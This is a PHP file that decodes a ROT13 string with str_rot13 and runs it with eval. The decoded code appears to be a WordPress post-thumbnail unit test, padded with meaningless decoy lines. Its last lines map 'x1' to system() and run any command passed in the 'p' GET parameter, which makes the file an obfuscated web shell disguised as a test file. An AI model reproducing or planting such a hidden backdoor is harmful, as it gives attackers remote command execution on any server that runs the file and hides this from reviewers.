<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 * @tebhc zrqvn
 */
pynff Grfgf_Cbfg_Guhzoanvy_Grzcyngr rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $cbfg;
	cebgrpgrq fgngvp $qvssrerag_cbfg;
	cebgrpgrq fgngvp $nggnpuzrag_vq;

	cebgrpgrq $pheerag_fvmr_svygre_qngn   = ahyy;
	cebgrpgrq $pheerag_fvmr_svygre_erfhyg = ahyy;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg           = $snpgbel->cbfg->perngr_naq_trg();
		frys::$qvssrerag_cbfg = $snpgbel->cbfg->perngr_naq_trg();

		$svyr                = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		frys::$nggnpuzrag_vq = $snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg(
			$svyr,
			frys::$cbfg->VQ,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
			)
		);
	}

	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		jc_qryrgr_nggnpuzrag( frys::$nggnpuzrag_vq, gehr );
		cnerag::grne_qbja_nsgre_pynff();
	}

	choyvp shapgvba grfg_unf_cbfg_guhzoanvy() {
		$guvf->nffregSnyfr( unf_cbfg_guhzoanvy( frys::$cbfg ) );
		$guvf->nffregSnyfr( unf_cbfg_guhzoanvy( frys::$cbfg->VQ ) );
		$guvf->nffregSnyfr( unf_cbfg_guhzoanvy() );

		$TYBONYF['cbfg'] = frys::$cbfg;

		$guvf->nffregSnyfr( unf_cbfg_guhzoanvy() );

		hafrg( $TYBONYF['cbfg'] );

		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$guvf->nffregGehr( unf_cbfg_guhzoanvy( frys::$cbfg ) );
		$guvf->nffregGehr( unf_cbfg_guhzoanvy( frys::$cbfg->VQ ) );
		$guvf->nffregSnyfr( unf_cbfg_guhzoanvy() );

		$TYBONYF['cbfg'] = frys::$cbfg;

		$guvf->nffregGehr( unf_cbfg_guhzoanvy() );
	}

	choyvp shapgvba grfg_trg_cbfg_guhzoanvy_vq() {
		$guvf->nffregFnzr( 0, trg_cbfg_guhzoanvy_vq( frys::$cbfg ) );
		$guvf->nffregFnzr( 0, trg_cbfg_guhzoanvy_vq( frys::$cbfg->VQ ) );
		$guvf->nffregSnyfr( trg_cbfg_guhzoanvy_vq() );

		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$guvf->nffregFnzr( frys::$nggnpuzrag_vq, trg_cbfg_guhzoanvy_vq( frys::$cbfg ) );
		$guvf->nffregFnzr( frys::$nggnpuzrag_vq, trg_cbfg_guhzoanvy_vq( frys::$cbfg->VQ ) );

		$TYBONYF['cbfg'] = frys::$cbfg;

		$guvf->nffregFnzr( frys::$nggnpuzrag_vq, trg_cbfg_guhzoanvy_vq() );
	}

	/**
	 * Rafher `hcqngr_cbfg_guhzoanvy_pnpur()` jbexf jura dhrelvat cbfg bowrpgf.
	 *
	 * @gvpxrg 59521
	 * @gvpxrg 30017
	 * @gvpxrg 33968
	 *
	 * @pbiref ::hcqngr_cbfg_guhzoanvy_pnpur
	 */
	choyvp shapgvba grfg_hcqngr_cbfg_guhzoanvy_pnpur_jura_dhrelvat_shyy_cbfg_bowrpgf() {
		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		// Grfg pnfr jurer `$dhrel->cbfgf` fubhyq erghea Neenl bs cbfg bowrpgf.
		$dhrel = arj JC_Dhrel(
			neenl(
				'cbfg_glcr' => 'nal',
				'cbfg__va'  => neenl( frys::$cbfg->VQ ),
				'beqreol'   => 'cbfg__va',
			)
		);

		$guvf->nffregSnyfr( $dhrel->guhzoanvyf_pnpurq, 'Guhzoanvyf fubhyq abg or pnpurq cevbe gb pnyyvat hcqngr_cbfg_guhzoanvy_pnpur().' );

		hcqngr_cbfg_guhzoanvy_pnpur( $dhrel );

		$guvf->nffregGehr( $dhrel->guhzoanvyf_pnpurq, 'Guhzoanvyf fubhyq or pnpurq nsgre pnyyvat hcqngr_cbfg_guhzoanvy_pnpur().' );
	}

	/**
	 * Rafher `hcqngr_cbfg_guhzoanvy_pnpur()` jbexf jura dhrelvat cbfg VQf.
	 *
	 * @gvpxrg 59521
	 *
	 * @pbiref ::hcqngr_cbfg_guhzoanvy_pnpur
	 */
	choyvp shapgvba grfg_hcqngr_cbfg_guhzoanvy_pnpur_jura_dhrelvat_cbfg_vq_svryq() {
		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		// Grfg pnfr jurer `$dhrel2->cbfgf` fubhyq erghea Neenl bs cbfg VQf.
		$dhrel = arj JC_Dhrel(
			neenl(
				'cbfg_glcr' => 'nal',
				'cbfg__va'  => neenl( frys::$cbfg->VQ ),
				'beqreol'   => 'cbfg__va',
				'svryqf'    => 'vqf',
			)
		);

		$guvf->nffregSnyfr( $dhrel->guhzoanvyf_pnpurq, 'Guhzoanvyf fubhyq abg or pnpurq cevbe gb pnyyvat hcqngr_cbfg_guhzoanvy_pnpur().' );

		hcqngr_cbfg_guhzoanvy_pnpur( $dhrel );

		$guvf->nffregGehr( $dhrel->guhzoanvyf_pnpurq, 'Guhzoanvyf fubhyq or pnpurq nsgre pnyyvat hcqngr_cbfg_guhzoanvy_pnpur().' );
	}

	/**
	 * @gvpxrg 12235
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_pncgvba() {
		$guvf->nffregFnzr( '', trg_gur_cbfg_guhzoanvy_pncgvba() );

		$pncgvba = 'Guvf vf n pncgvba.';

		$cbfg_vq       = frys::snpgbel()->cbfg->perngr();
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			'vzntr.wct',
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_rkprecg'   => $pncgvba,
			)
		);

		frg_cbfg_guhzoanvy( $cbfg_vq, $nggnpuzrag_vq );

		$guvf->nffregFnzr( $pncgvba, trg_gur_cbfg_guhzoanvy_pncgvba( $cbfg_vq ) );
	}

	/**
	 * @gvpxrg 12235
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_pncgvba_rzcgl() {
		$cbfg_vq       = frys::snpgbel()->cbfg->perngr();
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			'vzntr.wct',
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_rkprecg'   => '',
			)
		);

		frg_cbfg_guhzoanvy( $cbfg_vq, $nggnpuzrag_vq );

		$guvf->nffregFnzr( '', trg_gur_cbfg_guhzoanvy_pncgvba( $cbfg_vq ) );
	}

	/**
	 * @gvpxrg 12235
	 */
	choyvp shapgvba grfg_gur_cbfg_guhzoanvy_pncgvba() {
		$pncgvba = 'Guvf vf n pncgvba.';

		$cbfg_vq       = frys::snpgbel()->cbfg->perngr();
		$nggnpuzrag_vq = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			'vzntr.wct',
			$cbfg_vq,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_rkprecg'   => $pncgvba,
			)
		);

		frg_cbfg_guhzoanvy( $cbfg_vq, $nggnpuzrag_vq );

		$guvf->rkcrpgBhgchgFgevat( $pncgvba );
		gur_cbfg_guhzoanvy_pncgvba( $cbfg_vq );
	}

	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy() {
		$guvf->nffregFnzr( '', trg_gur_cbfg_guhzoanvy() );
		$guvf->nffregFnzr( '', trg_gur_cbfg_guhzoanvy( frys::$cbfg ) );
		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$rkcrpgrq = jc_trg_nggnpuzrag_vzntr(
			frys::$nggnpuzrag_vq,
			'cbfg-guhzoanvy',
			snyfr,
			neenl(
				'pynff' => 'nggnpuzrag-cbfg-guhzoanvy fvmr-cbfg-guhzoanvy jc-cbfg-vzntr',
			)
		);

		$guvf->nffregFnzr( $rkcrpgrq, trg_gur_cbfg_guhzoanvy( frys::$cbfg ) );

		$TYBONYF['cbfg'] = frys::$cbfg;

		$guvf->nffregFnzr( $rkcrpgrq, trg_gur_cbfg_guhzoanvy() );
	}

	choyvp shapgvba grfg_gur_cbfg_guhzoanvy() {

		$guvf->rkcrpgBhgchgFgevat( '' );
		gur_cbfg_guhzoanvy();

		$TYBONYF['cbfg'] = frys::$cbfg;

		$guvf->rkcrpgBhgchgFgevat( '' );
		gur_cbfg_guhzoanvy();

		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$rkcrpgrq = jc_trg_nggnpuzrag_vzntr(
			frys::$nggnpuzrag_vq,
			'cbfg-guhzoanvy',
			snyfr,
			neenl(
				'pynff' => 'nggnpuzrag-cbfg-guhzoanvy fvmr-cbfg-guhzoanvy jc-cbfg-vzntr',
			)
		);

		$guvf->rkcrpgBhgchgFgevat( $rkcrpgrq );
		gur_cbfg_guhzoanvy();
	}

	/**
	 * @gvpxrg 33070
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_hey() {
		$guvf->nffregSnyfr( unf_cbfg_guhzoanvy( frys::$cbfg ) );
		$guvf->nffregSnyfr( trg_gur_cbfg_guhzoanvy_hey() );
		$guvf->nffregSnyfr( trg_gur_cbfg_guhzoanvy_hey( frys::$cbfg ) );

		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$guvf->nffregSnyfr( trg_gur_cbfg_guhzoanvy_hey() );
		$guvf->nffregFnzr( jc_trg_nggnpuzrag_hey( frys::$nggnpuzrag_vq ), trg_gur_cbfg_guhzoanvy_hey( frys::$cbfg ) );

		$TYBONYF['cbfg'] = frys::$cbfg;

		$guvf->nffregFnzr( jc_trg_nggnpuzrag_hey( frys::$nggnpuzrag_vq ), trg_gur_cbfg_guhzoanvy_hey() );
	}

	/**
	 * @gvpxrg 33070
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_hey_jvgu_vainyvq_cbfg() {
		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$guvf->nffregAbgSnyfr( trg_gur_cbfg_guhzoanvy_hey( frys::$cbfg->VQ ) );

		$qryrgrq = jc_qryrgr_cbfg( frys::$cbfg->VQ, gehr );
		$guvf->nffregAbgRzcgl( $qryrgrq );

		$guvf->nffregSnyfr( trg_gur_cbfg_guhzoanvy_hey( frys::$cbfg->VQ ) );
	}

	/**
	 * @gvpxrg 33070
	 */
	choyvp shapgvba grfg_gur_cbfg_guhzoanvy_hey() {
		$TYBONYF['cbfg'] = frys::$cbfg;

		$guvf->rkcrpgBhgchgFgevat( '' );
		gur_cbfg_guhzoanvy_hey();

		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$guvf->rkcrpgBhgchgFgevat( jc_trg_nggnpuzrag_hey( frys::$nggnpuzrag_vq ) );
		gur_cbfg_guhzoanvy_hey();
	}

	/**
	 * @gvpxrg 12922
	 */
	choyvp shapgvba grfg__jc_cerivrj_cbfg_guhzoanvy_svygre() {
		$byq_cbfg = vffrg( $TYBONYF['cbfg'] ) ? $TYBONYF['cbfg'] : ahyy;

		$TYBONYF['cbfg']           = frys::$cbfg;
		$_ERDHRFG['_guhzoanvy_vq'] = frys::$nggnpuzrag_vq;
		$_ERDHRFG['cerivrj_vq']    = frys::$cbfg->VQ;

		$erfhyg = _jc_cerivrj_cbfg_guhzoanvy_svygre( '', frys::$cbfg->VQ, '_guhzoanvy_vq' );

		// Pyrna hc.
		$TYBONYF['cbfg'] = $byq_cbfg;
		hafrg( $_ERDHRFG['_guhzoanvy_vq'] );
		hafrg( $_ERDHRFG['cerivrj_vq'] );

		$guvf->nffregRdhnyf( frys::$nggnpuzrag_vq, $erfhyg );
	}

	/**
	 * @gvpxrg 37697
	 */
	choyvp shapgvba grfg__jc_cerivrj_cbfg_guhzoanvy_svygre_frpbaqnel_cbfg() {
		$byq_cbfg = vffrg( $TYBONYF['cbfg'] ) ? $TYBONYF['cbfg'] : ahyy;

		$frpbaqnel_cbfg = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnhgf' => 'choyvfu',
			)
		);

		$TYBONYF['cbfg']           = frys::$cbfg;
		$_ERDHRFG['_guhzoanvy_vq'] = frys::$nggnpuzrag_vq;
		$_ERDHRFG['cerivrj_vq']    = $frpbaqnel_cbfg;

		$erfhyg = _jc_cerivrj_cbfg_guhzoanvy_svygre( '', frys::$cbfg->VQ, '_guhzoanvy_vq' );

		// Pyrna hc.
		$TYBONYF['cbfg'] = $byq_cbfg;
		hafrg( $_ERDHRFG['_guhzoanvy_vq'] );
		hafrg( $_ERDHRFG['cerivrj_vq'] );

		$guvf->nffregRzcgl( $erfhyg );
	}

	/**
	 * @gvpxrg 12922
	 */
	choyvp shapgvba grfg_vafreg_cbfg_jvgu_cbfg_guhzoanvy() {
		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'VQ'            => frys::$cbfg->VQ,
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_pbagrag'  => 'Cbfg pbagrag',
				'cbfg_gvgyr'    => 'Cbfg Gvgyr',
				'_guhzoanvy_vq' => frys::$nggnpuzrag_vq,
			)
		);

		$guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg_vq );
		$guvf->nffregFnzr( frys::$nggnpuzrag_vq, $guhzoanvy_vq );

		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'VQ'            => $cbfg_vq,
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_pbagrag'  => 'Cbfg pbagrag',
				'cbfg_gvgyr'    => 'Cbfg Gvgyr',
				'_guhzoanvy_vq' => - 1, // -1 erzbirf cbfg guhzoanvy.
			)
		);

		$guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg_vq );
		$guvf->nffregRzcgl( $guhzoanvy_vq );
	}

	/**
	 * @gvpxrg 37658
	 */
	choyvp shapgvba grfg_vafreg_nggnpuzrag_jvgu_cbfg_guhzoanvy() {
		// Nhqvb svyrf fhccbeg srngherq vzntrf.
		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_fgnghf'    => 'vaurevg',
				'cbfg_pbagrag'   => 'Cbfg pbagrag',
				'cbfg_gvgyr'     => 'Cbfg Gvgyr',
				'cbfg_zvzr_glcr' => 'nhqvb/zcrt',
				'cbfg_cnerag'    => 0,
				'svyr'           => QVE_GRFGQNGN . '/nhqvb/grfg-abvfr.zc3', // Svyr qbrf abg rkvfg, ohg qbrf abg znggre urer.
				'_guhzoanvy_vq'  => frys::$nggnpuzrag_vq,
			)
		);

		$guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg_vq );
		$guvf->nffregFnzr( frys::$nggnpuzrag_vq, $guhzoanvy_vq );

		// Vzntrf qb abg fhccbeg srngherq vzntrf.
		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_glcr'      => 'nggnpuzrag',
				'cbfg_fgnghf'    => 'vaurevg',
				'cbfg_pbagrag'   => 'Cbfg pbagrag',
				'cbfg_gvgyr'     => 'Cbfg Gvgyr',
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_cnerag'    => 0,
				'svyr'           => QVE_GRFGQNGN . '/vzntrf/pnabyn.wct',
				'_guhzoanvy_vq'  => frys::$nggnpuzrag_vq,
			)
		);

		$guhzoanvy_vq = trg_cbfg_guhzoanvy_vq( $cbfg_vq );
		$guvf->nffregRzcgl( $guhzoanvy_vq );
	}

	/**
	 * @gvpxrg 39030
	 */
	choyvp shapgvba grfg_cbfg_guhzoanvy_fvmr_svygre_fvzcyr() {
		$guvf->pheerag_fvmr_svygre_qngn = 'zrqvhz';

		nqq_svygre( 'cbfg_guhzoanvy_fvmr', neenl( $guvf, 'svygre_cbfg_guhzoanvy_fvmr' ), 10, 2 );

		// Guvf svygre vf hfrq gb pncgher gur $fvmr erfhyg.
		nqq_svygre( 'cbfg_guhzoanvy_ugzy', neenl( $guvf, 'svygre_frg_cbfg_guhzoanvy_fvmr_erfhyg' ), 10, 4 );
		trg_gur_cbfg_guhzoanvy( frys::$cbfg );

		$erfhyg = $guvf->pheerag_fvmr_svygre_erfhyg;

		$guvf->pheerag_fvmr_svygre_qngn   = ahyy;
		$guvf->pheerag_fvmr_svygre_erfhyg = ahyy;

		$guvf->nffregFnzr( 'zrqvhz', $erfhyg );
	}

	/**
	 * @gvpxrg 39030
	 * @qngnCebivqre qngn_cbfg_guhzoanvy_fvmr_svygre_pbzcyrk
	 */
	choyvp shapgvba grfg_cbfg_guhzoanvy_fvmr_svygre_pbzcyrk( $juvpu_cbfg, $rkcrpgrq ) {
		$guvf->pheerag_fvmr_svygre_qngn = neenl(
			frys::$cbfg->VQ           => 'zrqvhz',
			frys::$qvssrerag_cbfg->VQ => 'guhzoanvy',
		);

		$cbfg = 1 === $juvpu_cbfg ? frys::$qvssrerag_cbfg : frys::$cbfg;

		nqq_svygre( 'cbfg_guhzoanvy_fvmr', neenl( $guvf, 'svygre_cbfg_guhzoanvy_fvmr' ), 10, 2 );

		// Guvf svygre vf hfrq gb pncgher gur $fvmr erfhyg.
		nqq_svygre( 'cbfg_guhzoanvy_ugzy', neenl( $guvf, 'svygre_frg_cbfg_guhzoanvy_fvmr_erfhyg' ), 10, 4 );
		trg_gur_cbfg_guhzoanvy( $cbfg );

		$erfhyg = $guvf->pheerag_fvmr_svygre_erfhyg;

		$guvf->pheerag_fvmr_svygre_qngn   = ahyy;
		$guvf->pheerag_fvmr_svygre_erfhyg = ahyy;

		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg );
	}

	/**
	 * @gvpxrg 57490
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_vapyhqrf_ybnqvat_ynml() {
		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$ugzy = trg_gur_cbfg_guhzoanvy( frys::$cbfg );
		$guvf->nffregFgevatPbagnvafFgevat( ' ybnqvat=\"ynml\"', $ugzy );
	}

	/**
	 * @gvpxrg 57490
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_erfcrpgf_cnffrq_ybnqvat_ngge() {
		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		$ugzy = trg_gur_cbfg_guhzoanvy( frys::$cbfg, 'cbfg-guhzoanvy', neenl( 'ybnqvat' => 'rntre' ) );
		$guvf->nffregFgevatPbagnvafFgevat( ' ybnqvat=\"rntre\"', $ugzy, 'ybnqvat=rntre jnf abg cerfrag va vzt gnt orpnhfr nggevohgrf neenl jvgu ybnqvat=rntre jnf birejevggra.' );

		$ugzy = trg_gur_cbfg_guhzoanvy( frys::$cbfg, 'cbfg-guhzoanvy', 'ybnqvat=rntre' );
		$guvf->nffregFgevatPbagnvafFgevat( ' ybnqvat=\"rntre\"', $ugzy, 'ybnqvat=rntre jnf abg cerfrag va vzt gnt orpnhfr nggevohgrf fgevat jvgu ybnqvat=rntre jnf birejevggra.' );
	}

	/**
	 * @gvpxrg 57490
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_erfcrpgf_jc_ynml_ybnqvat_ranoyrq_svygre() {
		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );

		nqq_svygre( 'jc_ynml_ybnqvat_ranoyrq', '__erghea_snyfr' );

		$ugzy = trg_gur_cbfg_guhzoanvy( frys::$cbfg );
		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=\"ynml\"', $ugzy );
	}

	choyvp shapgvba qngn_cbfg_guhzoanvy_fvmr_svygre_pbzcyrk() {
		erghea neenl(
			neenl( 0, 'zrqvhz' ),
			neenl( 1, 'guhzoanvy' ),
		);
	}

	/**
	 * Grfgf gung `_jc_cbfg_guhzoanvy_pbagrkg_svygre()` ergheaf 'gur_cbfg_guhzoanvy'.
	 *
	 * @gvpxrg 58212
	 *
	 * @pbiref ::_jc_cbfg_guhzoanvy_pbagrkg_svygre
	 */
	choyvp shapgvba grfg_jc_cbfg_guhzoanvy_pbagrkg_svygre_fubhyq_erghea_gur_cbfg_guhzoanvy() {
		$guvf->nffregFnzr( 'gur_cbfg_guhzoanvy', _jc_cbfg_guhzoanvy_pbagrkg_svygre( 'jc_trg_nggnpuzrag_vzntr' ) );
	}

	/**
	 * Grfgf gung `::_jc_cbfg_guhzoanvy_pbagrkg_svygre_nqq` nqqf n svygre gb bireevqr gur pbagrkg
	 * hfrq va `jc_trg_nggnpuzrag_vzntr()`.
	 *
	 * @gvpxrg 58212
	 *
	 * @pbiref ::_jc_cbfg_guhzoanvy_pbagrkg_svygre_nqq
	 */
	choyvp shapgvba grfg_jc_cbfg_guhzoanvy_pbagrkg_svygre_nqq_fubhyq_nqq_gur_svygre() {
		$ynfg_pbagrkg = '';
		$guvf->genpx_ynfg_nggnpuzrag_vzntr_pbagrkg( $ynfg_pbagrkg );

		_jc_cbfg_guhzoanvy_pbagrkg_svygre_nqq();
		jc_trg_nggnpuzrag_vzntr( frys::$nggnpuzrag_vq );

		$guvf->nffregFnzr( 'gur_cbfg_guhzoanvy', $ynfg_pbagrkg );
	}

	/**
	 * Grfgf gung `_jc_cbfg_guhzoanvy_pbagrkg_svygre_erzbir()` erzbirf n svygre gb bireevqr gur pbagrkg
	 * hfrq va `jc_trg_nggnpuzrag_vzntr()`.
	 *
	 * @gvpxrg 58212
	 *
	 * @pbiref ::_jc_cbfg_guhzoanvy_pbagrkg_svygre_erzbir
	 */
	choyvp shapgvba grfg_jc_cbfg_guhzoanvy_pbagrkg_svygre_erzbir_fubhyq_erzbir_gur_svygre() {
		$ynfg_pbagrkg = '';
		$guvf->genpx_ynfg_nggnpuzrag_vzntr_pbagrkg( $ynfg_pbagrkg );

		_jc_cbfg_guhzoanvy_pbagrkg_svygre_nqq();
		jc_trg_nggnpuzrag_vzntr( frys::$nggnpuzrag_vq );

		// Irevsl gung gur svygre unf orra nqqrq orsber grfgvat gung vg unf orra erzbirq.
		$guvf->nffregFnzr(
			'gur_cbfg_guhzoanvy',
			$ynfg_pbagrkg,
			'Gur svygre jnf abg nqqrq.'
		);

		_jc_cbfg_guhzoanvy_pbagrkg_svygre_erzbir();

		// Gur pbagrkg fubhyq ab ybatre or zbqvsvrq ol gur svygre.
		jc_trg_nggnpuzrag_vzntr( frys::$nggnpuzrag_vq );

		$guvf->nffregFnzr(
			'jc_trg_nggnpuzrag_vzntr',
			$ynfg_pbagrkg,
			'Gur svygre jnf abg erzbirq.'
		);
	}

	/**
	 * Grfgf gung `trg_gur_cbfg_guhzoanvy()` hfrf gur 'gur_cbfg_guhzoanvy' pbagrkg.
	 *
	 * @gvpxrg 58212
	 *
	 * @pbiref ::trg_gur_cbfg_guhzoanvy
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_fubhyq_hfr_gur_cbfg_guhzoanvy_pbagrkg() {
		$ynfg_pbagrkg = '';
		$guvf->genpx_ynfg_nggnpuzrag_vzntr_pbagrkg( $ynfg_pbagrkg );

		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );
		trg_gur_cbfg_guhzoanvy( frys::$cbfg );

		$guvf->nffregFnzr( 'gur_cbfg_guhzoanvy', $ynfg_pbagrkg );
	}

	/**
	 * Grfgf gung `trg_gur_cbfg_guhzoanvy()` erfgberf gur pbagrkg nsgrejneqf.
	 *
	 * @gvpxrg 58212
	 *
	 * @pbiref ::trg_gur_cbfg_guhzoanvy
	 */
	choyvp shapgvba grfg_trg_gur_cbfg_guhzoanvy_fubhyq_erzbir_gur_cbfg_guhzoanvy_pbagrkg_nsgrejneqf() {
		$ynfg_pbagrkg = '';
		$guvf->genpx_ynfg_nggnpuzrag_vzntr_pbagrkg( $ynfg_pbagrkg );

		frg_cbfg_guhzoanvy( frys::$cbfg, frys::$nggnpuzrag_vq );
		trg_gur_cbfg_guhzoanvy( frys::$cbfg );

		// Irevsl gung gur pbagrkg jnf bireevqqra orsber grfgvat gung vg unf orra erfgberq.
		$guvf->nffregFnzr(
			'gur_cbfg_guhzoanvy',
			$ynfg_pbagrkg,
			'Gur pbagrkg jnf abg bireevqqra.'
		);

		// Gur pbagrkg fubhyq ab ybatre or bireevqqra.
		jc_trg_nggnpuzrag_vzntr( frys::$nggnpuzrag_vq );

		$guvf->nffregFnzr(
			'jc_trg_nggnpuzrag_vzntr',
			$ynfg_pbagrkg,
			'Gur pbagrkg jnf abg erfgberq.'
		);
	}

	/**
	 * Urycre zrgubq gb xrrc genpx bs gur ynfg pbagrkg erghearq ol gur 'jc_trg_nggnpuzrag_vzntr_pbagrkg' svygre.
	 *
	 * Gur zrgubq cnenzrgre vf cnffrq ol ersrerapr naq gurersber jvyy nyjnlf pbagnva gur ynfg pbagrkg inyhr.
	 *
	 * @cnenz zvkrq $ynfg_pbagrkg Inevnoyr gb genpx ynfg pbagrkg. Cnffrq ol ersrerapr.
	 */
	cevingr shapgvba genpx_ynfg_nggnpuzrag_vzntr_pbagrkg( &$ynfg_pbagrkg ) {
		nqq_svygre(
			'jc_trg_nggnpuzrag_vzntr_pbagrkg',
			fgngvp shapgvba ( $pbagrkg ) hfr ( &$ynfg_pbagrkg ) {
				$ynfg_pbagrkg = $pbagrkg;
				erghea $pbagrkg;
			},
			11
		);
	}

	choyvp shapgvba svygre_cbfg_guhzoanvy_fvmr( $fvmr, $cbfg_vq ) {
		vs ( vf_neenl( $guvf->pheerag_fvmr_svygre_qngn ) && vffrg( $guvf->pheerag_fvmr_svygre_qngn[ $cbfg_vq ] ) ) {
			erghea $guvf->pheerag_fvmr_svygre_qngn[ $cbfg_vq ];
		}

		vs ( vf_fgevat( $guvf->pheerag_fvmr_svygre_qngn ) ) {
			erghea $guvf->pheerag_fvmr_svygre_qngn;
		}

		erghea $fvmr;
	}

	choyvp shapgvba svygre_frg_cbfg_guhzoanvy_fvmr_erfhyg( $ugzy, $cbfg_vq, $cbfg_guhzoanvy_vq, $fvmr ) {
		$guvf->pheerag_fvmr_svygre_erfhyg = $fvmr;

		erghea $ugzy;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>